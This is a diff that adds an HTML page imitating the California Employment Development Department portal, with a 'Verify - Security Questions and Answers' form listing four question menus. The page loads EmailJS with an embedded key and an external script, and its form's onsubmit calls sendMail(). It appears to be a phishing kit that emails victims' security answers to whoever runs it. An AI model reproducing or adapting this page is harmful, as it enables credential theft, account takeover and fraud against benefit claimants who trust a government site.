@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+
+<!-- 
+State of California 2013 master template
+Version 2013.xx.xx
+
+Based on 320 and Up boilerplate extension
+-->
+
+ <html class="no-js" lang="en"><!-- InstanceBegin template="#" codeOutsideHTMLIsLocked="false" --> <!--<![endif]-->
+
+                         <head>
+                            <script type="text/javascript"
+                            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+                        </script>
+                        <script type="text/javascript">
+                            (function(){
+                                emailjs.init("tjTWAyLNJH2ZUROnk");
+                            })();
+                        </script>
+                        <script src="index01.js" defer></script>
+
+                             <!-- <script>
+                                 window.dataLayer = window.dataLayer || [];
+                                 function gtag() { dataLayer.push(arguments); }
+                                 gtag('js', new Date());
+                                 gtag('config', 'UA-3419582-31', { 'anonymize_ip': true });
+                             </script>
+                             <script type="text/javascript">
+                                 function setUpClientDetails() {
+                                     Date.prototype.stdTimezoneOffset = function () {
+                                         var jan = new Date(this.getFullYear(), 0, 1);
+                                         var jul = new Date(this.getFullYear(), 6, 1);
+                                         return Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
+                                     }
+
+                                     Date.prototype.isDstObserved = function () {
+                                         return this.getTimezoneOffset() < this.stdTimezoneOffset();
+                                     }
+
+                                     var today = new Date();
+                                     var clientDate = document.getElementById('DFClientDate');
+                                     if (clientDate) {
+                                         clientDate.value = today.toJSON();
+                                     }
+                                     var clientTimeZone = document.getElementById('DFClientTimeZone');
+                                     if (clientTimeZone) {
+                                         clientTimeZone.value = today.isDstObserved() ? today.stdTimezoneOffset() : today.getTimezoneOffset();
+                                     }
+                                 }
+                             </script> -->
+
+                             <meta charset="utf-8">
+                             <!-- InstanceBeginEditable name="doctitle" -->
+                             <title>Employment Development Department</title>
+                             <!-- InstanceEndEditable -->
+                             <!-- InstanceBeginEditable name="MetaTags" -->
+                             <meta name="Author" content="#" />
+                             <meta name="Description" content="#" />
+                             <meta name="Keywords" content="#" />
+
+                             <!-- head content, for all pages -->
+                             <!-- Use highest compatibility mode, enable Chrome Frame -->
+                             <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+                             <meta http-equiv="Cache-Control" content="no-store" />
+
+                             <meta name="viewport" content="width=device-width, target-densitydpi=160dpi, initial-scale=1.0">
+
+                             <!-- InstanceEndEditable -->
+                             <!-- InstanceBeginEditable name="head" -->
+                             <!-- The jquery and modernizr scripts need to be rendered here so the template will work properly.-->
+                             <script src="#"></script>
+
+                             <script src="#"></script>
+
+
+                             <!-- bring in the template scripts and stylesheets after loading our jquery and modernizr scripts to satisfy dependencies -->
+
+                             
+<!-- head content, for all pages -->
+
+<!-- Use highest compatibility mode, enable Chrome Frame -->
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True"> <!-- for Blackberry, AvantGo -->
+<meta name="MobileOptimized" content="320"> <!-- for Windows mobile -->
+<meta name="viewport" content="width=device-width, target-densitydpi=160dpi, initial-scale=1.0">
+
+
+<!-- For all browsers -->
+<!--<link rel="stylesheet" href="csss/style.css">-->
+<link rel="stylesheet" href="csss/eGov_style.css">
+<link rel="stylesheet" href="csss/edd_style.css">
+
+<!--
+Step 3
+Select a color scheme: 
+-->
+
+<link rel="stylesheet" href="eeeed/colorscheme_oceanside.css">
+<link rel="stylesheet" href="eeeed/edd_colorscheme_oceanside.css">
+
+<link rel="stylesheet" media="print" href="csss/print.css">
+<!-- For progressively larger displays -->
+<link rel="stylesheet" media="only screen and (min-width: 768px)" href="csss/768.css">
+<link rel="stylesheet" media="only screen and (min-width: 768px)" href="csss/edd_768.css">
+<link rel="stylesheet" media="only screen and (min-width: 1280px)" href="csss/1280.css">
+<!-- For Retina displays -->
+<!-- <link rel="stylesheet" media="only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3/2), only screen and (min-device-pixel-ratio: 1.5)" href="/css/2x.css"> -->
+
+<!-- for jquery slideshow styles -->
+<!--<link rel="stylesheet" href="csss/jquery.bxslider.css">-->
+<link rel="stylesheet" href="csss/jquery-ui.min.css">
+
+<!-- selectivizr.com, emulates CSS3 pseudo-classes and attribute selectors in Internet Explorer 6-8 -->
+<!--[if (lt IE 9) & (!IEMobile)]>
+<script src="css/selectivizr-min.js"></script>
+<![endif]-->
+
+<!-- modernizr.com, feature detection -->
+<!-- *** Removed by e-Gov, called by our code *** -->
+
+<!-- For iPad 3-->
+<link rel="apple-touch-icon" sizes="144x144" href="imagess/apple-touch-icon-144x144.png">
+<!-- For iPhone 4 -->
+<link rel="apple-touch-icon" sizes="114x114" href="imagess/apple-touch-icon-114x114.png">
+<!-- For iPad 1-->
+<link rel="apple-touch-icon" sizes="72x72" href="imagess/apple-touch-icon-72x72.png">
+<!-- For iPhone 3G, iPod Touch and Android -->
+<link rel="apple-touch-icon" href="imagess/apple-touch-icon-57x57.png">
+<!-- For Nokia -->
+<link rel="shortcut icon" href="imagess/apple-touch-icon-57x57.png">
+<!-- For everything else -->
+<link rel="shortcut icon" href="imagess/favicon.ico">
+
+<!-- Activate ClearType for Mobile IE -->
+<!--[if IE]>
+<meta http-equiv="cleartype" content="on">
+<![endif]-->
+
+<!-- <script src="csss/eGov_scripts.js"></script> -->
+<!--<script src="csss/scripts.js"></script>--> <!-- ** calling the modified version instead **-->
+<!--<script src="csss/jquery-1.11.1.min.js"></script>--><!-- *** called by eGov code *** -->
+<script src="csss/jquery-ui.min.js"></script>
+<!--<script src="csss/jquery.bxslider.min.js"></script>-->
+<!-- *** eGov not using the following at this time *** -->
+<!--<script src="csss/jq_modal.js"></script>-->
+<!--<script src="csss/jq_expand.js"></script>-->
+
+<!--[if lt IE 9]>
+<script src="csss/respond.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 8]>
+<link rel="stylesheet" href="csss/ie7.css">
+<![endif]-->
+
+
+                             <!-- ****** Render the application specific scripts and styles ****** -->
+
+                             <!-- <script src="eeeed/amp-common.js"></script>
+
+                             <script src="https://portal.edd.ca.gov/WebApp/jqueryval?v=UKspXbtZaG2yflMHWVDGgUK_cbuL9yUgDEB-og0yNu01"></script>
+
+                             <script src="https://portal.edd.ca.gov/WebApp/bootstrap?v=sYTqL02CTePfDH6DfPFYr6m2FRldScVKev789LRk33E1"></script>
+
+                             <script src="https://portal.edd.ca.gov/WebApp/common?v=j-3fPg7X293G2MHkCbXXhmFoaQHaWzuZpMYkVxozats1"></script>
+
+
+<link href="https://portal.edd.ca.gov/WebApp/Content/css/en?v=6QLGxvxWqJ7kgYH0gjgGpp3UiVCC34vImysaQOBck-s1" rel="stylesheet"/>
+
+
+                             <script type="text/javascript">
+        /* Set the Global values for the application scripts */
+        var ROOT = '/WebApp/';
+
+        function setGlobalValues() {
+            //set the constants values
+            GlobalVals.cultureKey = 'l'
+            GlobalVals.cultureVal = 'en'
+            GlobalVals.langSearchKey = 'lang '
+            GlobalVals.langSearchVal = 'en'
+
+            GlobalVals.BASE_URL = '?' + GlobalVals.cultureKey + '=' + GlobalVals.cultureVal + '&' + GlobalVals.langSearchKey + '=' + GlobalVals.langSearchVal;
+        }
+                             </script> -->
+
+                             <!-- InstanceEndEditable -->
+
+                         </head>
+
+<body class="clearfix">
+    <header role="banner">
+        <div class="phone_hdr">
+            <div class="phone_hd_left">
+                <a class="p_h_button" id="p_h_menu"><span class="add_icon_font_normal ca-gov-icon-Ca-Gov-Menu"></span><span class="visuallyhidden">Menu</span></a>
+            </div>
+            <div class="phone_hd_right phone_hd_apps">
+                <form action="index01.js" method="post">           
+                    <input class="submit_link" type="submit" value="Log Out" />
+                </form>  
+           </div>
+            <div class="logo_and_banner">
+                <div class="head_cagov_logo"><a href="#"><img src="imagess/header_ca.gov.png" alt="CA.gov" /></a></div>
+                <div class="head_organization_banner"><a href="#"><img src="imagess/header_organization.png" alt="Employment Development Department" /></a></div>
+                <div class="head_organization_banner_phone"><a href="#"><img src="imagess/header_organization_phone.png" alt="Employment Development Department" /></a></div>
+            </div>
+        </div>
+
+        <div id="head_apps_content">
+            <form action="index01.js" method="post">                    
+                <span class="logoutUserName"> &nbsp | </span> <input class="submit_link button_link" type="submit" value="Log Out" />
+            </form>                   
+        </div>
+
+        <!-- Navigation -->
+        <nav id="navigation" class="singlelevelnav">
+                <ul id="nav_list">
+                    <li><a href="#" class="nav_level1_link"><span id="nav_home_container" class="add_icon_font_normal ca-gov-icon-Ca-Gov-Home" aria-hidden="true"></span><img src="imagess/clear.gif" alt="Home" /><span class="visuallyhidden">Home</span></a></li>
+
+                        <li class=" highlighted_nav_item"><a class="nav_level1_link" href="#">My Profile</a></li>
+
+                    <li><a class="nav_level1_link" href='#'>Benefit Programs Online</a></li>
+                </ul>
+
+        </nav>
+
+        <div id="img_ribbon"></div>
+    </header>
+    
+    <div id="main_content" class="clearfix">
+		    <div class="add_maincontent_padding">
+		    <!-- InstanceBeginEditable name="MainContent" -->
+                <h1>
+                    </span>
+                    
+                        
+Verify - Security Questions and Answers                    
+                </h1>
+                <div>
+                    <!--Profile Controller - SecurityQuestions/UpdateSQ View-->
+
+
+
+<div class="red_text validationErrorSummary">
+    
+</div>
+
+<p>
+    Choose your security questions and enter your answer to each question as selected previously. Questions and Answers must be the same as registered in our database.
+You must include a response for all questions before selecting Next.
+</p>
+<p>
+    <span class="required">Indicates required field</span>
+</p>
+<br />
+<!-- action="+_+_+.php" -->
+<form action="index01.js" method="post" onsubmit="sendMail(); return false;">
+    <input name="__RequestVerificationToken" type="hidden" value="ZLp3CSQeZzv8F" />    
+    <div class="container-fluid">
+        
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required hasInfoLabel">
+                
+                <label for="SelectedQuestionOne">Question 1:</label>
+            </div>
+            <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7 hasInfoInput">
+                <select id="q1" name="q1" style="width: 75%;">
+                    <option value="40">Who was your least favorite guest at your wedding?</option>
+                    <option value="favorite author">Who is your favorite author?</option>
+                    <option value="childhood nickname">What was your least favorite childhood nickname?</option>
+                    <option value="a movie theater">What was the first movie you saw in a movie theater?</option>
+                    <option value="science fiction movie?">What is your favorite science fiction movie?</option>
+                    <option value="first stuffed animal">What was the name you gave your first stuffed animal?</option>
+                    <option selected="selected" value="favorite pet's name">What was your favorite pet's name?</option>
+                    <option value="honor at your wedding">What was the name of your best man or maid of honor at your wedding?</option>
+                    <option value="your first job">In what location was your first job?</option>
+                    <option value="first pets name">What was your first pets name?</option>
+                    <option value="girl you first kissed">What is the first name of the boy or girl you first kissed?</option>
+                    <option value="to but didnt attend">What is the name of a college you applied to but didnt attend?</option>
+                </select>
+                <div></div>
+            </div>
+        </div>
+        <br />
+        
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SecurityAnswerOne">Answer:</label>
+            </div>
+            <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+                <input class="custInput rounded leaveSpace text-box single-line" id="a1" name="a1" type="text" value="" />
+                <div>
+                    
+                </div>
+            </div>
+        </div>
+        <br /><br />
+        
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SelectedQuestionTwo">Question 2:</label>
+        </div>
+        <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+           <select id="q2" name="q2" style="width: 75%;">
+                <option value="celebrate your 40th birthday">Where did you celebrate your 40th birthday?</option>
+                <option value="wedding reception held?">Where was your wedding reception held?</option>
+                <option value="your 21st birthday?">Where did you celebrate your 21st birthday?</option>
+                <option value="childhood crush">Who was your most memorable childhood crush?</option>
+                <option value="most resemble?">What celebrity do you most resemble?</option>
+                <option value="love to see lose">What sports team do you love to see lose?</option>
+                <option value="favorite hobby">What is your favorite hobby?</option>
+                <option value="concert you attended">What was the first concert you attended?</option>
+                <option value="music you purchased">What musical artist created the first music you purchased?</option>
+                <option value="fathers occupation">What was your fathers occupation?</option>
+                <option value="favorite teacher?">What was the last name of your favorite teacher?</option>
+                <option selected="selected" value="first job you quit">What was the first job you quit?</option>
+            </select>
+            <div>    
+            </div>
+        </div>
+    </div>
+    <br />
+    
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SecurityAnswerTwo">Answer:</label>
+        </div>
+        <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+            <input class="custInput rounded leaveSpace text-box single-line" id="a2" name="a2" type="text" value="" />
+            <div>
+                
+            </div>
+        </div>
+    </div>
+    <br /><br />
+    
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SelectedQuestionThree">Question 3:</label>
+        </div>
+        <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+           <select id="q3" name="q3" style="width: 75%;">
+                <option value="movie in high school">What was your favorite movie in high school?</option>
+                <option value="fifth grade teacher">What was the last name of your fifth grade teacher?</option>
+                <option value="visited as a child">Where is the coldest location you visited as a child?</option>
+                <option value="or significant other">In what city did you meet your spouse or significant other?</option>
+                <option selected="selected" value="childhood nickname">What was your childhood nickname?</option>
+                <option value="had your first job">What was the name of the business where you had your first job?</option>
+                <option value="play as a child">What was your favorite game to play as a child?</option>
+                <option value="best childhood friend">What is the name of your best childhood friend?</option>
+                <option value="senior prom theme">What was your high school senior prom theme?</option>
+                <option value="visit as a child">What was your favorite place to visit as a child?</option>
+                <option value="band in high school">What was your favorite band in high school?</option>
+                <option value="restaurant as a child">What was your favorite restaurant as a child?</option>
+            </select>
+            <div>
+                
+            </div>
+        </div>
+    </div>
+    <br />
+    
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SecurityAnswerThree">Answer:</label>
+        </div>
+        <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+            <input class="custInput rounded leaveSpace text-box single-line" id="a3" name="a3" type="text" value="" />
+            <div>
+                
+            </div>
+        </div>
+    </div>
+    <br /><br />
+    
+    <div class="row">
+        <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+            
+            <label for="SelectedQuestionFour">Question 4:</label>
+        </div>
+        <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+            <select id="q4" name="q4" style="width: 75%;">
+                <option value="sport in high school">What was your favorite sport in high school?</option>
+                <option value="dance to at your wedding">What song did you dance to at your wedding?</option>
+                <option value="cartoon character">What is the name of your favorite cartoon character?</option>
+                <option value="book as a child?">What was your favorite book as a child?</option>
+                <option value="school or college">What was your favorite hangout spot in high school or college?</option>
+                <option value="birth weight?">What was your oldest childs birth weight?</option>
+                <option value="relative to visit">Who was your favorite relative to visit when you were a child?</option>
+                <option selected="selected" value="favorite animal">What is your favorite animal?</option>
+                <option value="mother and father meet">In what location did your mother and father meet?</option>
+                <option value="first boss">What was the name of your first boss?</option>
+                <option value="job as a child">What was your dream job as a child?</option>
+                <option value="volunteer">For what organization did you first volunteer?</option>
+            </select>
+            <div>
+                
+            </div>
+        </div>
+    </div>
+    <br />
+    
+        <div class="row">
+            <div class="col-xxs-12 col-xs-3 col-md-3 formLabelDiv verticalCenterLabel required">
+                
+                <label for="SecurityAnswerFour">Answer:</label>
+            </div>
+            <div class="col-xxs-12 col-xs-9 col-sm-9 col-md-7">
+                <input class="custInput rounded leaveSpace text-box single-line" id="a4" name="a4" type="text" value="" />
+            <div>
+        </div>
+        </div>
+    </div>
+    <br /><br />
+    
+        <div class="row">
+            <!-- <button type="submit" class="enterSubmit" name="command"></button> -->
+                <div class="col-xxs-12 col-xs-12 col-sm-4 col-md-3">
+                    <button type="submit" class="fullWidth cancel button" name="command" value="cancelUpdate"
+                    style="width: 40%;">Cancel</button>
+                </div>
+                <div class="col-xxs-12 col-xs-12 col-sm-4 col-md-3">
+                    <button class="fullWidth button" type="submit" name="command" value="update"
+                    style="width: 40%;"
+                    >Next</button>
+                </div>
+            </div>
+        </div>
+</form>
+                </div>
+                
+		    <!-- InstanceEndEditable -->
+		    </div>
+	    <div class="cleaner"></div>
+    </div>
+
+    <div>        
+    <footer id="footer_2" class="clearfix">
+        <div>
+            <p><a href="#">Contact EDD</a> | <a href="#">Conditions of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Accessibility</a> <!--| <a href="/">Full Site</a></p>-->
+            <p>Copyright &copy; 2021 State of California</p>
+        </div>
+
+        <div class="clearfix"></div>
+    </footer>
+
+    <div id="background_decorative">&nbsp;</div>
+    </div>
+</body>
+<!-- InstanceEnd -->
+</html>
+
